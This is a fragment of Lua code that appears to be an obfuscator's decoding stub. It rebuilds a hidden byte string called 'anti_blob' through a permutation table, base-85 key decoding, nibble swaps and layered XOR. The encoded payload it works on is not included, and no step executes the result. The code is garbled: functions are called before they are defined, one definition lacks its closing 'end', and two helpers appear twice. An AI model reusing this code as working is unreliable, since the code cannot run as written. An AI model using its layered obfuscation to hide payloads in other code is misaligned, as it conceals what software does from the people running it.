local O = {}
for n in string.gmatch([[76,83,31,75,28,59,88,33,13,87,91,98,39,65,14,63,4,36,23,22,41,6,81,26,49,9,45,90,66,95,85,50,11,57,24,34,35,78,40,37,18,12,42,68,46,64,84,43,44,17,89,79,2,55,10,72,30,1,92,96,8,27,48,60,29,61,56,70,38,86,62,0,69,53,20,58,32,93,74,21,19,16,5,73,80,7,94,67,47,15,97,71,77,3,25,82,54,51,52]], "[^,]+") do
    O[#O + 1] = tonumber(n)
end
local KA = U([[0p0k0t0O]])
local KB = U([[060o0N0w]])
local SS = U([[2U0K1N0z1*0K]])
local Rtab = {}
for i = 1, #P do
    Rtab[O[i] + 1] = U(P[i])
end
local flat = {}
for i = 1, #Rtab do
    for j = 1, #Rtab[i] do
        flat[#flat + 1] = Rtab[i][j]
    end
end
local real = {}
for i = 2, #flat, 3 do
    real[#real + 1] = flat[i]
end
for i = 1, #real - 1, 2 do
    local v = real[i]
    real[i] = real[i + 1]
    real[i + 1] = v
end
for i = 1, #real do
    local v = real[i]
    real[i] = ((v % 16) * 16) + math.floor(v / 16)
end
local d = {}
for i = 1, #real do
    local v = real[i]
    for j = #KB, 1, -1 do
        v = (v - KB[j]) % 256
        if v < 0 then
            v = v + 256
        end
    end
    for j = #KA, 1, -1 do
        v = (v - KA[j]) % 256
        if v < 0 then
            v = v + 256
        end
    end
    d[i] = v
end
local function X(a, b)
    local r, p = 0, 1
    while a > 0 or b > 0 do
        if a % 2 ~= b % 2 then
            r = r + p
        end
        a = math.floor(a / 2)
        b = math.floor(b / 2)
        p = p * 2
    end
    return r
end
local function apply(data, s, t)
    local ks = s
    local s2 = {}
    for i = 1, #data do
        s2[i] = X(X(data[i], ks % 256), (i * 13 + 7) % 256)
        ks = (ks + t) % 256
    end
    return s2
end
d = apply(d, SS[5], SS[6])
d = apply(d, SS[3], SS[4])
d = apply(d, SS[1], SS[2])
local o = {}
for i = #d, 1, -1 do
    o[#o + 1] = string.char(d[i])
end
local anti_blob = table.concat(o)


local A = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+,-./:;<=>?@^_{"
local M = {}
for i = 1, #A do
    M[string.sub(A, i, i)] = i - 1
end
local function U(s)
    local o = {}
    local i = 1
    while i <= #s do
        o[#o + 1] = (M[string.sub(s, i, i)] or 0) * 85 + (M[string.sub(s, i + 1, i + 1)] or 0)
        i = i + 2
    end
    return o

local function X(a, b)
    local r, p = 0, 1
    while a > 0 or b > 0 do
        if a % 2 ~= b % 2 then
            r = r + p
        end
        a = math.floor(a / 2)
        b = math.floor(b / 2)
        p = p * 2
    end
    return r
end
local function apply(data, s, t)
    local ks = s
    local s2 = {}
    for i = 1, #data do
        s2[i] = X(X(data[i], ks % 256), (i * 13 + 7) % 256)
        ks = (ks + t) % 256
    end
    return s2
end
